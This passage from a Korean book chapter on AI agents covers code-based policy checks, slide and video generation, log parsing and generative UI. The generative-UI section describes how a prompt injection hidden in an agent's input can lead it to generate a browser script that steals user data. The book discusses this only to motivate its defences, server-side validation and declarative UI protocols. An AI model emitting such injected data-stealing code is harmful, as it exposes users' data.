    if r.cabin_class in ["basic_economy", "economy"]:
        if r.has_insurance:
            execute_cancellation(reservation_id)
            return {"success": True, "reason": f"{r.cabin_class} with insurance"}
        return {"success": False, "reason": f"{r.cabin_class} requires insurance"}

    return {"success": False, "reason": "Does not meet cancellation policy"}
```

이 설계의 가치는 두 층위로 봐야 합니다.

**첫 번째 층위: checklist로서의 매개변수.** 도구 설명에 완전한 취소 정책이 나열되어 있고, "호출 전에 예약 상세 정보를 조회해 하나씩 확인할 것"을 요구합니다. 선택 가능한 `expected_*` 매개변수는 모델이 자신의 판단 근거를 명시적으로 적도록 한 걸음 더 유도합니다. 이 매개변수들을 채우기 위해 모델은 먼저 조회 도구를 호출해 예약 상세 정보를 얻고 각 조건을 하나씩 확인해야 합니다——매개변수를 채우는 과정 자체가 본질적으로 **강제적 checklist**인 것입니다. 모델이 좌석 등급이 이코노미이고 보험을 구매하지 않았음을 조회했을 때, 호출을 준비하는 과정에서 규칙 5를 이미 알아채, **애초에 호출을 시도조차 하지 않고** 사용자에게 곧바로 "이코노미석은 보험 미가입 시 취소가 불가능합니다. 보험 가입 후 취소하거나 일정 변경을 고려해보세요"라고 알려줄 가능성이 큽니다. 이 층위의 가치는 사고를 이끌고 무효 호출을 줄이는 데 있습니다; 다만 안전 책임은 지지 않습니다——`expected_*` 매개변수는 모델의 자체 진술일 뿐, 서버는 이를 절대 사실로 취급하지 않습니다.

**두 번째 층위: 서버 진리값 검증이야말로 진짜 문지기.** 코드 속 핵심 설계에 주목하세요: 좌석 등급, 보험 상태, 예약 시간, 구간 사용 여부, 항공편 상태는 모두 서버가 데이터베이스를 조회해 얻으며, 현재 시각도 서버 시계에서 옵니다. **어떤 정책 사실도 모델이 자체 보고한 매개변수에서 오지 않습니다.** 이는 불필요한 신중함이 아닙니다: 모델은 환각을 일으킬 수도 있고, 프롬프트 주입으로 조종당할 수도 있습니다——앞서 "치명적 세 요소"에서 분석했듯, 같은 컨텍스트 안의 Agent는 스스로 결백을 증명하기 어렵습니다. 만약 `cabin_class`, `has_insurance`, 심지어 `current_time`을 모델이 채워 넣는 매개변수로 설계했다면, 모델이 값 하나를 잘못 보고하거나(혹은 그렇게 유도당하면) "문지기"는 유명무실해집니다. 마지막 방어선은 반드시 모델이 위조할 수 없는 데이터 위에 세워져야 합니다——이는 앞서 언급한 "핵심 동작은 독립적인 검증이 필요하다"는 입장과 일맥상통합니다: 독립성은 독립된 모델뿐 아니라 독립된 데이터 출처도 가리킵니다.

이렇게 3중 보장이 완성됩니다: (1) 시스템 프롬프트의 자연어 규칙이 이해와 설명을 돕고; (2) 도구 설명과 매개변수 설계가 checklist 역할을 해, 모델이 호출 전에 조건을 명시적으로 확인하도록 유도하며; (3) 데이터베이스 진리값에 기반한 서버 층의 코드화된 검증이 마지막 문지기가 됩니다. 앞의 두 겹은 오류의 발생을 줄이고, 세 번째 겹은 오류가 돌이킬 수 없는 손실로 변하지 않도록 보장합니다.

> **실험 5-3 ★★: 소형 모델이 코드화된 지식을 통해 규칙 실행의 정확도를 향상시킴**
>
> **실험 목표**: 소규모 파라미터 모델(Qwen3-4B)이 코드화된 비즈니스 규칙을 통해 복잡한 정책 실행의 정확도와 일관성을 유의미하게 향상시킬 수 있음을 검증.
>
> **기술 방안**: τ-bench 항공 고객 서비스 시나리오에 기반한 대조 실험 설계. **대조군**: 순수 자연어 규칙, 모델 자체 사고에만 의존. **실험군**: 3중 보장——시스템 프롬프트에 자연어 규칙 유지; 도구 설명에 완전한 정책을 나열하고, 선택 가능한 `expected_*` 매개변수로 모델이 호출 전에 하나씩 확인(checklist)하도록 유도; 도구 내부에는 시뮬레이션 데이터베이스 진리값에 기반한 코드화된 검증(정책 사실은 예외 없이 DB에서 조회, 시간은 서버 시계 사용, 모델의 자체 보고 매개변수는 채택하지 않음). 평가 지표: 작업 성공률, 정책 위반 횟수, 무효 도구 호출 횟수, 사용자 경험.
>
> **예상 결과**: 실험군이 대조군보다 유의미하게 우수. 더 중요하게는, 모델이 매개변수를 준비하는 과정에서 위반 조작을 스스로 인지해 사용자에게 대체 방안을 직접 제안하는 것을 관찰함으로써 "checklist로서의 매개변수"의 유효성을 검증한다; 동시에 `expected_*` 자체 보고값과 데이터베이스 진리값의 불일치 비율을 통계해, "서버 진리값 검증"이 오인식을 차단하는 필요성을 검증한다.
>

### 코드가 주도하는 멀티미디어 생성

많은 복잡한 문서 작성은 본질적으로 구조화된 데이터의 조직과 표현입니다. 프레젠테이션이든, 기술 보고서든, 대화형 애플리케이션이든, 그 바탕에는 모두 코드가 정의합니다——HTML이 구조를 서술하고, CSS가 스타일을 제어하며, JavaScript가 상호작용을 구현합니다. 전통적인 문서 작성은 GUI 인터페이스의 위지위그(WYSIWYG) 편집에 의존하지만, Agent에게는 직관적이지도 효율적이지도 않습니다. GUI 조작은 시각적 이해와 정확한 좌표 위치 지정을 필요로 하기 때문입니다. 코드 생성을 통해 Agent는 시각적 위치 지정이라는 난제를 우회하고 문서에 대한 정밀한 통제력을 얻습니다——각 요소의 위치, 스타일, 내용이 명확히 정의되어 있어 프로그램적인 방식으로 수정하고 최적화할 수 있습니다.

**PPT 생성 Agent.**

PPT 제작은 종종 시간과 노력이 많이 듭니다. 전형적인 학술 발표 PPT는 수십 페이지의 슬라이드를 포함할 수 있고, 각 페이지마다 레이아웃 설계, 요점 정리, 차트 선택이 필요합니다. PPT 제작을 코드 생성 문제로 재구성하면 복잡도를 크게 줄일 수 있습니다. 현대적인 PPT 프레임워크(예: Slidev)는 우아한 설계 철학을 채택합니다: Markdown과 HTML로 발표 내용을 정의합니다. 슬라이드 한 페이지를 만드는 데는 간결한 마크업 언어만 작성하면 되고, 프레임워크가 렌더링, 레이아웃, 애니메이션을 자동으로 처리합니다. 코드 생성 능력을 갖춘 Agent에게 매우 친화적입니다.

![그림5-5 PPT 생성의 제안자-검토자 메커니즘](images/fig5-5.svg)


코드를 생성하는 것만으로는 충분하지 않습니다. **코드를 작성한 뒤에도 Agent는 실제 렌더링 효과를 알지 못합니다**: 내용이 너무 빽빽한지, 글자가 넘치는지, 이미지 크기가 적절한지는 실제로 렌더링해봐야만 알 수 있습니다. 따라서 **제안자-검토자**(Proposer-Reviewer) 메커니즘(그림5-5 참조)을 도입해 코드 작성과 품질 검토를 독립된 두 Agent로 분리해야 합니다:

- **Proposer Agent**는 Slidev 코드를 생성하는 일을 맡아, 내용의 논리 구조를 이해하고 합리적인 페이지로 분해
- **Reviewer Agent**는 코드를 실행해 각 페이지를 이미지로 렌더링하고, Vision LLM(이미지를 "볼" 수 있는 멀티모달 대형 모델)으로 콘텐츠 밀도, 가독성, 레이아웃 합리성, 시각적 미감 등의 차원에서 렌더링 결과를 분석해 **구조화된 개선 제안**을 생성——모호한 "안 예쁘다"가 아니라, 구체적이고 실행 가능한 지침(예: "3페이지: 내용 과다, 분할 권장", "7페이지: 코드 블록 폰트 과소, 14pt로 확대 권장")으로, 페이지 번호, 문제 유형, 심각도 등의 필드를 포함

Proposer는 피드백을 받은 뒤 의도를 이해해 코드를 수정하고, 새 버전을 다시 Reviewer에게 제출해 검토받는 것을 품질이 기준에 도달하거나 최대 횟수(예: 5회)에 도달할 때까지 반복합니다. "품질 도달"과 "최대 라운드"는 정확히 Loop 엔지니어링이 요구하는 두 가지 명시적 종료 조건입니다: 전자는 검토자가 목표 달성을 판정하는 것이고, 후자는 예산 상한으로 순환 통제 불능을 방지하는 것입니다.

이 장의 제안자-검토자 반복 루프는 제4장의 **사전 승인**과 같은 뿌리에서 나온 것으로——둘 다 제안자-검토자 패러다임의 사례입니다: 생성과 검토의 분리, 이중 모델의 독립적 평가(Loop 엔지니어링의 언어로 말하면 "제조자"와 "검증자"의 분리된 하위 Agent). 차이는 목표와 형태에 있습니다: 제4장은 이를 되돌릴 수 없는 조작의 안전 검토에 사용해, 검토자가 단일 조작에 대해 승인이나 거부를 내립니다; 이 장은 이를 콘텐츠 품질의 반복적 개선에 사용합니다——여러 라운드 순환이며, 검토자는 제안자가 볼 수 없는 새로운 정보(렌더링 결과)에 접근합니다. 핵심 설계 원칙은 일맥상통합니다(공유 목표 제약, 같은 유형의 오류 확률을 낮추기 위해 다른 모델 계열 사용, 피드백을 특수 이벤트로 Proposer 궤적에 추가). 단일 Agent 순환이 아니라 이중 Agent 분업을 채택하는 **핵심 우위는 컨텍스트 관리**에 있습니다: Reviewer는 매번 최신 버전의 렌더링 이미지만 처리해 과거 버전에 방해받지 않고; Proposer는 구조화된 텍스트 피드백만 누적해 토큰 소모가 적고 추론하기도 쉽습니다. 단일 Agent 방안은 같은 컨텍스트에서 수십 페이지의 렌더링 이미지가 여러 라운드에 걸쳐 누적되어야 해, 컨텍스트가 빠르게 한계를 초과합니다. 이 메커니즘은 후속 영상 편집과 로그 시각화 실험에서 반복 사용될 것입니다; 제10장은 제안자-검토자 외의 다른 멀티 Agent 협업 패턴을 더 다룹니다.

> **실험 5-4 ★★: 논문 기반 PPT 자동 생성**
>
> **실험 목표**: 학술 논문에서 고품질 발표자료를 자동 생성해, 제안자-검토자 메커니즘이 콘텐츠 창작 품질 통제에 미치는 효과를 검증.
>
> **기술 방안**: Slidev 프레임워크 사용. Proposer Agent가 논문 PDF를 읽어 장 구조, 핵심 논점, 도표를 추출해 PPT 구조를 계획하고 페이지별로 Slidev 코드를 생성. **핵심 단계**: Reviewer Agent가 각 페이지를 스크린샷으로 렌더링하고, Vision LLM으로 렌더링 효과를 검사해 텍스트 넘침, 콘텐츠 밀집, 이미지 크기 부적절 등의 문제를 식별하고 구조화된 개선 제안을 생성. 효과가 기준에 도달할 때까지 반복.
>
> **인수 기준**: 10-20페이지 PPT 생성, 논문의 주요 기여를 커버. 최소 3곳에서 원본 도표를 사용하고 텍스트 설명과 일치. 렌더링에 텍스트 넘침 없고 레이아웃 합리적. 단일 Agent 자체 검토 vs 제안자-검토자 분업이 컨텍스트 소모와 생성 품질 면에서 보이는 차이를 비교.
>

> **실험 5-5 ★★: 논문 해설 영상 자동 생성**
>
> **실험 목표**: PPT 생성 능력을 확장해, 시각과 청각 채널을 결합한 영상 해설 자동 생성을 구현.
>
> **기술 방안**: 실험 5-4의 PPT 생성 흐름을 기반으로, Agent가 각 페이지의 구어체 해설 텍스트(복술이 아닌 안내형 서술)를 동시에 생성하고, TTS(텍스트 음성 변환)를 호출해 음성을 합성한 뒤, ffmpeg로 PPT 스크린샷과 오디오를 동기화해 영상으로 합성.

> **인수 기준**: 영상 길이 5-15분, 페이지별 노출 시간과 음성 길이가 정확히 일치, 해설 내용과 시각 요소가 호응.

**영상 편집 Agent.**

범용 Computer Use로 영상 편집을 하는 것은 근본적인 도전에 직면합니다: 영상 편집 소프트웨어의 GUI는 극히 복잡해, 대량의 타임라인, 레이어, 효과 패널을 포함합니다. Agent는 이런 인터페이스 요소를 정확히 찾아내고 마우스와 키보드 조작으로 편집해야 하는데, 정확한 좌표를 출력하는 것이 매우 어렵습니다.

영상 편집을 API 호출과 코드 생성 문제로 재구성하면 복잡도가 크게 낮아집니다. 많은 전문 소프트웨어(예: Blender——Python 스크립트 제어를 지원하는 오픈소스 3D 창작 및 영상 합성 도구; FFmpeg——음성·영상 처리 분야의 명령줄 만능 도구)는 프로그램적 API 인터페이스를 제공해, 핵심 기능을 구조화되고 조합 가능한 방식으로 노출합니다. 예를 들어 Blender Python API는 코드를 통해 영상 클립의 가져오기, 자르기, 배치, 전환 효과, 오디오 믹싱 등의 조작을 정확히 제어할 수 있게 해주며, 각 조작은 명확한 함수 호출에 대응합니다. Agent에게는 자연어 요구를 API 호출로 전환하는 것이 GUI 인터페이스를 이해하고 마우스 클릭을 시뮬레이션하는 것보다 훨씬 쉽습니다. PPT 생성과 마찬가지로 영상 편집도 제안자-검토자 메커니즘을 채택합니다——Proposer Agent가 Blender 스크립트를 생성하고, Reviewer Agent가 핵심 프레임을 렌더링해 Vision LLM으로 효과를 검사하고 수정 제안을 피드백합니다.

> **실험 5-6 ★★: API 기반 지능형 영상 편집**
>
> **실험 목표**: Agent가 Blender Python API 코드를 생성해 영상 편집을 구현하는 능력을 검증하고, 시각적 피드백에 기반한 제안자-검토자 메커니즘이 멀티미디어 콘텐츠 처리에서 하는 역할을 평가.
>
> **핵심 도전**: 사용자의 자연어 편집 요구를 이해해 정확한 API 호출 시퀀스로 전환하고, 다양한 편집 조작(클립, 병합, 자막, 오디오 트랙 믹싱, 시각 효과)을 처리하며, 생성된 Python 스크립트가 올바르게 실행되도록 보장. Proposer Agent는 코드를 작성한 뒤 영상 효과를 직접 판단할 수 없으므로, 반드시 Reviewer Agent가 렌더링하고 Vision LLM으로 핵심 프레임을 검사해야 함.
>
> **기술 방안**: 사용자가 영상 소재(서핑, 하이킹, 스키 등 장면이 포함된 원본 소재 등)를 제공하고 자연어로 요구를 서술(예: "서핑 부분을 잘라내줘"). Proposer Agent는 영상 분석 하위 Agent를 통해 **2단계 위치 지정 전략**을 채택:
>
> **1단계, 대략적 위치 지정**: 하위 Agent를 호출해 영상 경로, 10초 간격 스크린샷, 목표 질문을 전달. 하위 Agent가 ffmpeg로 핵심 프레임을 캡처하고, 모든 스크린샷과 질문을 함께 Vision LLM에 입력해 장면 구간을 반환(예: "서핑은 40-110초 구간").
>
> **2단계, 정밀 위치 지정**: 더 좁은 범위와 초당 스크린샷 밀도로 하위 Agent를 다시 호출해 경계 시점을 정확히 위치 지정.
>
> 영상 분석을 하위 Agent로 캡슐화해 대량의 스크린샷이 메인 Agent의 컨텍스트를 차지하는 것을 방지. 위치 지정 후 Blender API 스크립트를 생성. Reviewer Agent가 빠른 미리보기를 실행해 핵심 프레임을 검사하고 수정 제안을 피드백, 기준에 도달할 때까지 반복한 뒤 완전한 렌더링을 진행.
>
> **인수 기준**: Agent가 영상 내 서로 다른 장면을 정확히 식별하고, 자연어 지시에 따라 올바른 편집 스크립트를 생성해야 함. 시작과 종료 지점의 위치가 정확해야 함(오차 3초 이내). 지시에 특수 효과 요구(슬로우 모션, 전환, 자막)가 포함된 경우 생성된 영상이 효과를 올바르게 적용해야 함. Reviewer Agent가 명백한 오류(핵심 내용 누락, 무관한 조각 포함)를 탐지해 수정을 촉발할 수 있어야 함. 최종 출력 영상의 파일 형식이 올바르고 화질이 기대에 부합해야 함.
>

### 시스템 어댑터로서의 코드

앞 절들의 코드는 대부분 "사람을 향한" 산출물——보고서, 슬라이드, 인터페이스——을 만들었습니다. 이 절의 코드는 다른 방향을 가리킵니다: **기계와 기계의 연결**. 실제 시스템에서 Agent가 상대해야 하는 외부 서비스는 종종 기성 SDK가 없고 인터페이스도 규범적이지 않습니다——문서 부재, 비표준 반환 형식, 버전에 따라 표류하는 필드. 이런 상황에서 Agent는 사람이 미리 어댑터 층을 작성해줄 때까지 기다릴 필요 없이, 그 자리에서 인터페이스 문서를 읽거나 실제 응답 한두 개를 직접 관찰해 즉시 어댑터 코드를 생성합니다: HTTP 클라이언트 구축, 인증 헤더 조립, 비표준 반환 구조 파싱, 상위 데이터 모델을 하위가 소비할 수 있는 형태로 번역. 여기서 코드는 임의의 시스템을 연결하는 "만능 접착제"가 됩니다——연결이 안 되는 곳이 있으면 그 자리에서 접착제 한 조각을 생성해 이어붙입니다. 이것이 바로 메타 능력 "시스템 인터페이스" 방향의 핵심입니다. 아래에서 전개할 로그 적응형 파싱은 이 능력이 관측 가능성(observability) 시나리오에서 구체화된 것입니다: 끊임없이 진화하는 로그 형식 앞에서 Agent는 마찬가지로 그 자리에서 파싱 코드를 생성해 적응합니다.

이 "만능 접착제"는 **API가 전혀 없는 시스템**으로도 확장될 수 있습니다: 외부 시스템이 그래픽 인터페이스만 노출할 때, Agent는 먼저 Computer Use(제9장에서 자세히 소개)로 인터페이스를 조작한 뒤, 성공적으로 완수한 조작 시퀀스를 코드로 고정해 RPA 도구로 만들 수 있습니다——이후 같은 작업을 수행할 때는 코드를 직접 실행해 매우 높은 속도와 안정성으로 조작을 완수하며, 비용이 큰 시각적 사고를 다시 호출할 필요가 없습니다. RPA는 "시스템 어댑터"가 인터페이스 없는 시스템에서 극단적으로 나타난 형태라 할 수 있습니다; 이런 "워크플로 녹화와 고정" 메커니즘은 제8장에서 전개합니다.

데이터 처리는 소프트웨어 시스템에서 가장 흔하면서도 가장 골치 아픈 작업 중 하나입니다. 근본 원인은 데이터 형식의 다양성과 끊임없는 변화에 있습니다. 같은 시스템이 진화 과정에서 데이터 형식을 여러 차례 수정할 수 있습니다——새 필드 추가, 중첩 구조 변경, 새 타입 도입. 형식마다 파싱 코드를 손으로 작성하면 유지보수 비용이 매우 높아, 형식이 바뀔 때마다 파싱 로직을 갱신하고, 호환성을 테스트하고, 새 버전을 배포해야 합니다.

코드 생성은 완전히 새로운 사고방식을 제공합니다: Agent가 새로운 형식을 만났을 때 샘플 데이터에 기반해 즉석에서 파싱 코드를 생성하게 함으로써, 시스템이 데이터 형식의 진화에 자동으로 적응해 사람의 개입이 필요 없게 합니다.

**Agent 로그 파싱과 시각화.**

Agent 시스템의 관측 가능성은 실행 흐름의 시각화에 달려 있습니다. 복잡한 Agent 작업은 수백 단계의 조작을 포함할 수 있고, 여러 차례의 LLM 호출, 수십 개의 도구 실행, 여러 하위 Agent 상호작용을 수반합니다. 이런 데이터를 시각화하는 데는 여러 도전이 따릅니다: 서로 다른 도구가 서로 다른 구조의 데이터를 반환하고, 형식은 시스템 반복에 따라 계속 진화합니다; 완전한 궤적 하나가 수십만 자를 포함할 수 있어 개요와 세부 사이의 균형을 찾아야 합니다.

코드 생성은 우아한 해결책을 제공합니다: 자동 수정되는 피드백 루프를 구축하는 것입니다. 프런트엔드가 파싱할 수 없는 로그 형식을 만나면, 오류를 표시하는 대신 실패 정보(원본 로그 샘플, 상세 오류)를 자동으로 Agent에게 보고합니다. Agent는 샘플 데이터 구조를 분석해 올바르게 파싱할 수 있는 프런트엔드 코드를 생성합니다. 코드는 먼저 가상 브라우저에서 자동 테스트를 거치고(파싱 정확성 검증, Vision LLM으로 시각화 효과 검사), 통과하면 프런트엔드 시스템에 핫 업데이트됩니다.

> **실험 5-7 ★★★: 적응형 로그 파싱 시스템**
>
> **실험 목표**: 스스로 진화할 수 있는 Agent 로그 시각화 시스템 구축.
>
> **기술 방안**: 초기 시스템은 기본 형식만 지원. 프런트엔드가 파싱 실패 감지 → Agent에 보고 → 파싱 코드 생성 → 가상 브라우저 테스트 → 핫 업데이트 배포. 전체 흐름 자동화.
>
> **인수 기준**: 실패를 자동 감지해 학습을 촉발하고, 생성된 코드가 자동 테스트를 통과하며, 핫 업데이트 후 새 형식을 올바르게 파싱해야 함.
>

**Agent 실행 로그 자동 분석과 문제 진단.**

프로덕션 환경의 Agent는 대량의 궤적 로그(trajectory, 매 작업의 전체 과정을 기록)를 생성합니다. 그러나 로그에서 문제를 식별하고, 근본 원인을 찾아내고, 테스트 케이스를 구축하는 것은 비용이 큰 작업입니다. 문제 위치 지정이 어려운 이유는 작업 실패가 여러 모듈의 협동 오류로 유발될 수 있기 때문이고; 재현 비용이 높은 이유는 프로덕션 환경의 복잡성을 테스트 환경에서 시뮬레이션하기 어렵기 때문이며; 이미 수정된 문제가 반복해서 재발하기 쉬운 이유는 체계적인 회귀 테스트가 부족하기 때문입니다.

코드 생성은 진단에 자동화된 경로를 제공합니다. Agent는 프로덕션 로그를 읽고, 아키텍처 문서와 PRD(제품 요구사항 문서)를 결합해 실행 흐름이 예상에 부합하는지 자동으로 판단해, 문제가 있는 단계와 모듈을 위치 지정할 수 있습니다. 분석 결과에 기반해 구조화된 문제 보고서(우선순위, 모듈, 서술, 개선 제안)와 회귀 테스트 케이스를 생성합니다——테스트 케이스는 문제 궤적 ID와 핵심 상호작용 라운드를 참조하며, 테스트 프레임워크가 자동으로 재생해 수정 후 시스템이 동일한 입력에서 올바른 행동을 산출하는지 검증합니다. 마지막으로 Agent는 MCP를 통해 GitHub와 연동해 Issue를 생성하고 관련 개발자에게 할당함으로써, 문제 발견부터 작업 배분까지 전 과정 자동화를 완수합니다.

> **실험 5-8 ★★★: 프로덕션 로그의 지능형 진단 시스템**
>
> **실험 목표**: 프로덕션 궤적에서 문제를 자동으로 발견하고, 테스트 케이스를 생성하고, 작업 항목을 생성.
>
> **기술 방안**: Agent가 프로덕션 환경의 궤적 집합을 읽고, 시스템 아키텍처 문서와 PRD를 결합해 분석: 문제 패턴을 식별하고, 관련된 모듈을 위치 지정. 구조화된 문제 보고서(우선순위, 모듈, 서술, 개선 제안)를 생성. 회귀 테스트 케이스를 자동 생성(궤적 ID와 상호작용 라운드를 참조하며, 테스트 프레임워크가 자동 재생해 검증). MCP를 통해 GitHub와 연동해 Issue를 자동 생성.

### 생성형 UI로서의 코드

전통적인 Agent 시스템은 주로 순수 텍스트 대화에 의존해 사용자와 상호작용합니다. 그러나 텍스트는 선형적이고 단일한 상호작용 방식으로, 많은 시나리오에서 효율이 낮습니다. 구조화된 정보를 수집해야 할 때 반복적인 질문-답변은 대화를 장황하게 만들고, 복잡한 데이터 관계를 표현해야 할 때 순수 텍스트의 표현력은 제한적이며, 여러 옵션 중에서 사용자가 선택하게 해야 할 때 텍스트 목록은 시각화된 인터페이스만큼 직관적이지 못합니다.

코드 생성은 이런 한계를 돌파할 가능성을 제공합니다: Agent는 폼, 대화형 차트, 심지어 완전한 웹 애플리케이션을 동적으로 생성해, 정적인 텍스트 대화를 풍부한 멀티모달 상호작용으로 격상시킬 수 있습니다. 이런 Agent가 동적으로 인터페이스를 생성하는 패턴을 **생성형 UI**(Generative UI)라 부릅니다.

**A2UI류 프로토콜: 생성형 UI의 표준화.**

Agent가 HTML과 JavaScript 코드를 직접 생성해 UI로 삼을 때, 근본적인 보안 문제가 하나 있습니다: 생성된 코드에 악성 내용이 포함될 수 있다는 것입니다. 예를 들어 누군가 입력에 고의로 명령을 숨겨놓았다면, Agent가 프롬프트 주입에 조종당해 자기도 모르게 사용자 데이터를 몰래 훔치는 스크립트를 생성할 수 있습니다. 여기서 인과 관계를 명확히 해야 합니다: 원인은 **프롬프트 주입**(악성 명령이 Agent의 입력에 섞여 들어감)이고, 최종적으로 브라우저에서 악성 스크립트가 실행되어 데이터를 훔치는 **결과**는 전통적인 웹의 XSS(Cross-Site Scripting, 크로스 사이트 스크립팅)와 유사합니다——전체 공격을 그냥 XSS라고 부를 수는 없습니다. A2UI(Agent-to-User Interface)로 대표되는 선언적 인터페이스 프로토콜은 더 안전한 방향을 제공합니다: Agent가 실행 가능한 코드를 직접 생성하지 않고, "인터페이스 서술 목록"(JSON 형식)만 출력합니다. 예를 들어 "3행 2열의 표를 표시해줘, 제목은 「매출 데이터」"처럼요. 클라이언트는 이 목록을 받으면 자신이 미리 준비해둔 안전한 컴포넌트로 인터페이스를 렌더링합니다. 이는 마치 식당의 메뉴판과 같습니다: 손님(Agent)은 메뉴판에 있는 요리(사전 정의된 컴포넌트)만 주문할 수 있지, 주방에 들어가 직접 요리(임의 코드 실행)를 할 수는 없습니다. 여기서 흔한 혼동 하나를 짚어야 합니다: AG-UI(Agent-User Interaction, CopilotKit이 제안)는 이름은 비슷하지만 인터페이스 서술 언어가 아니라, 짝을 이루는 **이벤트/전송 프로토콜**로, Agent의 실행 상태(메시지, 도구 호출, 상태 패치)를 프런트엔드에 스트리밍 전달하는 역할을 하며, 그 자체가 A2UI 같은 인터페이스 페이로드를 실을 수도 있습니다. 따라서 둘은 동종이 아니라 상호보완적이며, 같은 "선언적 인터페이스 프로토콜"로 나란히 놓아서는 안 됩니다.

이런 프로토콜의 핵심 설계 원칙은 **안전 우선**입니다: 클라이언트가 신뢰할 수 있는 컴포넌트 목록(예: Card, Button, TextField, Table)을 유지하고, Agent는 목록에 있는 컴포넌트의 렌더링만 요청할 수 있어 임의 코드를 주입할 수 없습니다. 클라이언트는 자체 네이티브 컴포넌트로 렌더링하지, Agent가 생성한 임의의 HTML을 실행하지 않습니다. 이런 프로토콜은 대개 **크로스 플랫폼**(동일한 서술이 React, Flutter, 네이티브 앱에서 렌더링됨)과 **증분 생성**(스트리밍 JSONL 형식, 받으면서 바로 렌더링)도 지원합니다.

물론 선언적 방법은 표준화된 상호작용 시나리오(폼, 표, 카드)에 적합하며, 고도로 커스터마이즈된 요구(맞춤 시각화, 게임 인터페이스 등)에는 코드를 직접 생성하는 편이 여전히 더 유연한 선택입니다. 아래에서 두 모드의 구체적 응용을 보여줍니다.

**HTML로 산출물 전달: Markdown 보고서를 대체.** 생성형 UI는 상호작용 과정에서만 쓰이는 것이 아니라, Agent의 최종 **산출물** 형태도 바꾸고 있습니다. 전통적으로 Agent는 작업을 끝낸 뒤 Markdown 보고서 문서를 산출하는 경우가 많았지만, 페이지를 넘겨가며 선형으로 배치된 Markdown을 읽는 것은 사실 그다지 읽기 편하지 않습니다. Agent의 프런트엔드 코드 생성 능력이 점점 강해지면서, 점점 더 많은 실천이 곧바로 HTML을 산출하는 쪽으로 바뀌고 있습니다. Markdown에 비해 HTML 산출물은 몇 가지 뚜렷한 장점이 있습니다. 첫째는 **대화형 시연**입니다: 조작 가능한 형태로 시스템이 어떻게 작동하는지 직접 시연할 수 있어, 사용자가 대개 한눈에 이해하고 이는 긴 텍스트 설명을 능가합니다. 둘째는 **더 나은 데이터 시각화**입니다: 표가 아니라 차트로 데이터를 표현하고, 대화형 컴포넌트를 구축해 사용자가 스스로 훑어보고, 걸러내고, 관심 있는 세부사항으로 드릴다운할 수 있게 합니다. 셋째는 **지속적으로 완성되는 산출물**입니다: HTML 웹사이트는 작업이 끝날 때 한 번에 산출되는 죽은 물건일 필요가 없고, 작업이 진행되는 과정에서 Agent가 계속 보완하고 완성해나갈 수 있습니다.

필자가 직접 논문을 쓴 경험을 예로 들면: 필자는 연구 프로젝트마다 대화형 웹사이트를 하나씩 유지합니다[^ch5-4]. 이는 최종 산출물이자, 연구 과정 중의 살아있는 문서이기도 합니다——필자는 실험이 진행됨에 따라 Agent가 이를 계속 갱신하도록 합니다. 이 웹사이트는 최소 세 가지 역할을 맡습니다. 첫째는 **실험 데이터 추적**입니다: 각 실험의 구체적인 데이터, 사용된 프롬프트, LLM의 원본 응답을 웹사이트에서 하나하나 확인할 수 있습니다. 이들을 펼쳐놓으면 데이터 구성, 데이터 형식, 데이터 분포상의 문제를 더 쉽게 발견할 수 있고, LLM의 응답과 judge의 채점 사이에 체계적 편향이 있는지도 더 쉽게 알아볼 수 있습니다. 둘째는 **훈련 지표 모니터링**입니다: 훈련 과정의 각 곡선을 웹페이지에 직접 나열해, 모델의 **내과 지표**가 건강한지 언제든 확인할 수 있게 합니다. 여기서 의학의 "내과"라는 표현을 빌린 것으로, 내과 지표는 훈련 과정 자체가 정상인지 반영하는 내부 신호를 가리킵니다. 예를 들어 훈련 손실과 검증 손실, 그래디언트 노름, 학습률, 모델이 토큰을 출력할 때의 퍼플렉시티(perplexity, 모델이 자신이 생성하는 내용에 대해 갖는 "확신" 정도를 측정), 그리고 강화학습에서의 보상, KL 발산, 정책 엔트로피 등입니다. 이들은 작업 정확도 같은 최종 결과 지표와는 다릅니다: 건강검진의 각종 생리 지표가 한 사람의 외적 표현과 다른 것처럼, 내과 지표는 손실 미수렴, 그래디언트 폭발, 훈련 붕괴 같은 문제를 더 일찍 드러내는 경우가 많습니다. 셋째는 **작동 원리 시연**입니다: 시각화된 방식으로 전체 시스템의 작동 원리를 보여줘, AI로 구축된 이 시스템이 대체 어떤 구조인지 한눈에 볼 수 있게 합니다.

[^ch5-4]: 필자의 연구 프로젝트 웹사이트는 https://01.me/research/ 를 참조. 각 프로젝트마다 지속적으로 갱신되는 대화형 웹사이트가 딸려 있습니다.

**사용자 의도 명확화.**

사용자의 요구가 모호하거나 불완전하게 표현될 때, Agent는 명확화 질문을 통해 필요한 정보를 수집해야 합니다. OpenAI Deep Research 같은 제품은 보통 텍스트 질의응답 방식을 채택하지만, 여기에는 뚜렷한 한계가 있습니다: 효율 면에서, 질문마다 한 라운드의 대화가 필요해 명확화 지점이 열 개면 열 라운드의 상호작용이 필요합니다; 표현력 면에서, 일부 질문 사이에는 의존 관계가 존재하는데(예를 들어 "여행 목적지 선택"이 "교통 수단"의 선택 가능 항목에 영향을 줌) 순수 텍스트로는 이런 연쇄 관계를 표현하기 어렵습니다.

코드 생성을 통해 Agent는 텍스트 질의응답을 대체할 구조화된 상호작용 인터페이스를 만들 수 있습니다. 그림5-8은 동적 폼 생성 흐름을 보여주며, Agent가 명확화 질문을 한 번에 작성 가능한 구조화된 인터페이스로 전환하는 방법을 설명합니다. Agent는 다양한 입력 컨트롤을 포함한 HTML 폼을 생성합니다——텍스트 상자로 개방형 정보를 수집하고, 드롭다운 메뉴로 사용자가 사전 정의된 옵션 중 선택하게 하고, 체크박스로 다중 선택을 허용하고, 날짜 선택기로 시간 입력을 간소화합니다. 더 나아가 Agent는 JavaScript로 동적 로직을 구현한 계단식 폼을 생성할 수 있습니다: 특정 옵션을 선택하면 후속 질문을 자동으로 표시하거나 숨기고, 선택 가능 항목을 동적으로 갱신합니다. 사용자는 폼 전체를 한 번에 작성해 여러 라운드의 대화가 필요 없으며, 작성해야 할 모든 정보와 질문 간의 논리 관계를 명확히 볼 수도 있습니다.

![그림5-8 동적 폼 생성 흐름](images/fig5-8.svg)


> **실험 5-9 ★★: 동적 폼 생성을 통한 의도 명확화 시스템**
>
> **실험 목표**: Agent가 HTML 폼을 동적으로 생성해 사용자 의도를 명확히 하는 능력을 검증.
>
> **기술 방안**: Agent가 사용자 요청을 분석해 명확화 지점을 식별하고, 계단식 로직이 포함된 폼 코드를 생성. 프런트엔드가 렌더링하면 사용자가 한 번에 제출하고, Agent가 JSON 데이터를 파싱해 작업을 계속 진행.
>
